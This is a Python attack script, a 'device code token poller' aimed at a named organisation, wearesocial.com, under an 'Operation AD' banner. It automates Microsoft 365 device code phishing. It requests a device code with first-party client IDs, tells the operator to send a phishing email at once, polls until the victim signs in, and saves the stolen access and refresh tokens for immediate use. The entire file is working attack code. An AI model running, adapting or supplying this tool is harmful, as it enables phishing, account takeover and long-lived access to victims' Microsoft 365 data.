#!/usr/bin/env python3
"""
M365 Device Code Token Poller
Target: wearesocial.com
Date: 2026-01-23

This script automates the device code phishing flow:
1. Requests a device code from Microsoft
2. Outputs the user code for phishing email
3. Polls the token endpoint until user authenticates
4. Saves captured tokens to file
"""

import requests
import time
import json
import sys
from datetime import datetime

# Microsoft OAuth Configuration
TENANT_ID = "common"  # Use 'common' for multi-tenant or specific tenant ID
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office client ID

# Alternative Client IDs:
# "1b730954-1685-4b74-9bfd-dac224a7b894" - Azure PowerShell
# "04b07795-8ddb-461a-bbee-02f9e1bf7b46" - Azure CLI
# "d3590ed6-52b3-4102-aeff-aad2292ab01c" - Microsoft Office
# "00000002-0000-0ff1-ce00-000000000000" - Office 365 Exchange Online

DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

# Scopes for access
SCOPE = "https://graph.microsoft.com/.default offline_access"


def get_device_code():
    """Request a device code from Microsoft"""
    data = {
        "client_id": CLIENT_ID,
        "scope": SCOPE
    }
    
    response = requests.post(DEVICE_CODE_URL, data=data)
    
    if response.status_code == 200:
        return response.json()
    else:
        print(f"[!] Error getting device code: {response.text}")
        sys.exit(1)


def poll_for_token(device_code_response):
    """Poll the token endpoint until user authenticates"""
    device_code = device_code_response["device_code"]
    interval = device_code_response.get("interval", 5)
    expires_in = device_code_response.get("expires_in", 900)  # Default 15 min
    
    start_time = time.time()
    
    print(f"\n[*] Polling for authentication (expires in {expires_in} seconds)...")
    print(f"[*] Polling interval: {interval} seconds")
    
    while time.time() - start_time < expires_in:
        data = {
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "client_id": CLIENT_ID,
            "device_code": device_code
        }
        
        response = requests.post(TOKEN_URL, data=data)
        result = response.json()
        
        if "access_token" in result:
            return result
        elif result.get("error") == "authorization_pending":
            elapsed = int(time.time() - start_time)
            remaining = expires_in - elapsed
            print(f"[*] Waiting for user authentication... ({remaining}s remaining)", end="\r")
        elif result.get("error") == "authorization_declined":
            print("\n[!] User declined the authorization request")
            return None
        elif result.get("error") == "expired_token":
            print("\n[!] Device code expired")
            return None
        else:
            print(f"\n[!] Unexpected error: {result}")
        
        time.sleep(interval)
    
    print("\n[!] Polling timeout - device code expired")
    return None


def save_tokens(tokens, target_email):
    """Save captured tokens to file"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"tokens_{target_email.replace('@','_at_')}_{timestamp}.json"
    
    with open(filename, 'w') as f:
        json.dump(tokens, f, indent=2)
    
    print(f"\n[+] Tokens saved to: {filename}")
    return filename


def main():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║         M365 Device Code Token Poller                        ║
    ║         Operation AD - wearesocial.com                       ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Get target email (optional, for logging)
    if len(sys.argv) > 1:
        target_email = sys.argv[1]
    else:
        target_email = input("[?] Enter target email (for logging): ").strip() or "unknown"
    
    # Step 1: Get device code
    print("\n[*] Requesting device code from Microsoft...")
    device_code_response = get_device_code()
    
    user_code = device_code_response["user_code"]
    verification_url = device_code_response["verification_uri"]
    
    print("\n" + "="*60)
    print(f"[+] USER CODE: {user_code}")
    print(f"[+] URL: {verification_url}")
    print("="*60)
    print("\n[!] IMPORTANT: Send phishing email NOW with the code above!")
    print(f"[!] Code expires in {device_code_response.get('expires_in', 900)} seconds")
    
    # Step 2: Poll for token
    tokens = poll_for_token(device_code_response)
    
    if tokens:
        print("\n" + "="*60)
        print("[+] SUCCESS! Tokens captured!")
        print("="*60)
        
        # Display token info
        print(f"\n[+] Access Token (first 50 chars): {tokens['access_token'][:50]}...")
        print(f"[+] Token Type: {tokens.get('token_type', 'N/A')}")
        print(f"[+] Expires In: {tokens.get('expires_in', 'N/A')} seconds")
        print(f"[+] Scope: {tokens.get('scope', 'N/A')}")
        
        if "refresh_token" in tokens:
            print(f"[+] Refresh Token: CAPTURED (valid for ~1 year)")
        
        # Save tokens
        save_tokens(tokens, target_email)
        
        # Output for immediate use
        print("\n[*] For immediate use:")
        print(f"export ACCESS_TOKEN='{tokens['access_token']}'")
        if "refresh_token" in tokens:
            print(f"export REFRESH_TOKEN='{tokens['refresh_token']}'")
        
        return 0
    else:
        print("\n[!] Failed to capture tokens")
        return 1


if __name__ == "__main__":
    sys.exit(main())
